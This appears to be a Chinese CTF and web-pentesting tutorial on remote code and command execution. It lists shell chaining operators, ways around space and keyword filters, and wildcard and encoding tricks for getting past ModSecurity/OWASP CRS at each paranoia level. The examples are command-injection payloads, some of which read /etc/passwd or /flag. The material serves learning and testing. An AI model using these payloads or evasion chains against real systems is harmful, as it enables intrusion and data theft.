RCE 远程代码/命令执行

2025-12-28 WEB渗透 ， 基础漏洞

一、概念与本质

RCE（Remote Code/Command Execution）分两层意思：

  • 代码执行：用户输入被当作脚本代码解析执行（eval('phpinfo();')）
  • 命令执行：脚本语言调用操作系统命令执行（system('whoami')）

打个比方：代码执行是往 PHP 引擎里塞 PHP 代码让它跑；命令执行是借 PHP 的手去敲系统命令，最终是系统 shell 在干活。

漏洞产生的根源：不可信的数据被传入了可执行代码/命令的函数，且未做充分过滤。

三、命令拼接与连接符

不管是 CTF 还是实战，RCE 能打多深很大程度上取决于你能把多少条命令串起来。

3.1 Linux Shell

符号 效果 示例
; 顺序执行，不管前面成功与否 ping 127.0.0.1;whoami
| 管道，前命令输出作后命令输入 cat /etc/passwd | grep root
|| 前面失败才执行后面 cat /flag || ls
&& 前面成功才执行后面 ping 127.0.0.1 && whoami
& 并列执行 ping 127.0.0.1 & whoami
`cmd` 反引号内命令先执行 echo `whoami`
$(cmd) 与反引号等价 echo $(whoami)
%0a / \n 换行符分隔（URL 中用） ip=127.0.0.1%0awhoami
%0d%0a 回车换行（CRLF） 双换行分隔

3.2 Windows CMD

符号 效果
& 无条件执行多条（URL 中编码 %26）
&& 前面成功才执行后面
|| 前面失败才执行后面
| 管道
%0a 换行分隔
%1a .bat 文件特殊分隔符

实战注意：URL 中 & 会被识别为参数分隔符，必须编码为 %26 或 %26%26。

3.3 内联执行

`cmd` 和 $(cmd) 不止是命令分隔符——它们会把内部命令的执行结果替换到当前位置，当成外层命令的参数来执行。这个特性在实战中非常实用：

四、空格过滤绕过

空格是最常被拦的字符之一，绕过方法也最多：

方法 示例 原理
$IFS cat${IFS}/flag Shell 内部字段分隔符，默认值含空格/Tab/换行
$IFS$9 cat$IFS$9/flag $9 截断，防止后面字符粘连
%09（Tab） cat%09/flag PHP 解析时 %09 变成 Tab
%20（空格编码） cat%20/flag URL 编码的空格
< 或 <> cat</flag / cat<>/flag 重定向符在命令和参数间起到分隔作用
{cmd,arg} {cat,/flag} Bash 花括号展开，逗号起到分隔效果
/**/ cat/**//flag 类似 SQL 注入的注释分隔，部分场景可绕过

$IFS 最常用，但注意：纯数字环境下 $IFS 不太稳定，可以换 %09。

5.3 通配符

通配符只能匹配文件路径，不能匹配命令名。
写 c?t /flag 是不行的——shell 在执行命令前，先做通配符展开（globbing），但命令名 c?t 不在展开范围内，shell 不会去 $PATH 里搜 c?t 对应的可执行文件。必须写成 /bin/c?t /flag，让通配符去匹配 /bin/ 这个路径下的文件名。

? 比 * 安全：WAF 对 * 的敏感度远高于 ?，实战优先用 ? 凑。

十一、实战绕过思路

11.1 分层试探法

  1. 先搞清楚过滤了什么（空格？分号？关键字？斜杠？）
  2. 选最省事的绕过（空格 → $IFS，分号 → %0a，关键字 → 引号拼接）
  3. 一层不够再叠一层（编码 + 通配符 + 变量拼接）
  4. WAF 场景优先用 ? 而不是 *

11.2 组合示例

假设过滤了 | & ; / cat flag：

  • %0a 替 ;（换行分隔命令）
  • %09 替空格（Tab）
  • dir_name 用 *_name 等通配符凑
  • file*.php 通配文件名
  • tac 替 cat

11.3 ModSecurity / OWASP CRS

不同 Paranoia Level（PL）绕过难度差异很大：

  • PL1-2：? 通配符 + / 在允许字符集内，通配符绕过成功率不错
  • PL3：检测重复非文字字符（多个 ?），少量用仍可过，如 /et?/passw?
  • PL4：字符集缩到 a-z A-Z 0-9，常规技巧基本失效，得上编码链
